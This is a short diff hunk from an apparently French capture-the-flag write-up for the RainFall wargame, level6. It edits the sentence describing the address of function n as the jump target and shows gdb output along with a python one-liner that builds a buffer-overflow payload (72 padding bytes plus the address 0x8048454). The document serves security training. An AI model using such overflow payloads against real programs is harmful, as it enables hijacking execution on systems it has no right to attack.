@@ -71,7 +71,7 @@ Program received signal SIGSEGV, Segmentation fault.
 (gdb) p n
 $1 = {<text variable, no debug info>} 0x8048454 <n>
 ```
-L'adresse de n est "0x8048454".
+L'adresse de n vers où jump est "0x8048454".
 
 ```
 level6@RainFall:~$ python -c 'print "a"*72 + "\x54\x84\x04\x08"' > /tmp/exploit3
